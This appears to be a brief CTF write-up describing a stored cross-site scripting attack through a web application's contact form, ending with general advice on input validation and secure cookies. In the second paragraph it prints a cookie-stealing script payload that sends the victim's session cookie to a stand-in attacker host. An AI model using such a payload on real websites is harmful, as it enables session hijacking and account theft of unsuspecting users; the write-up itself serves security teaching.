Title: Cross-Site Scripting (XSS) Attack via Contact Form

During a CTF competition, I encountered a web application that allowed users to contact the website administrators via a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into web pages viewed by other users.

To test for XSS, I crafted a malicious payload containing a script that would steal the victim's session cookie, such as <script>new Image().src="http://attacker.com/cookie?="+document.cookie;</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and steal the victim's session cookie, it would confirm the presence of an XSS vulnerability.

Upon submitting the crafted payload to the application, it indeed executed and stole the victim's session cookie, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a script that would display the flag.

After researching the application's structure and available resources, I crafted a suitable payload containing a script that would display the flag and submitted it to the application's contact form. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
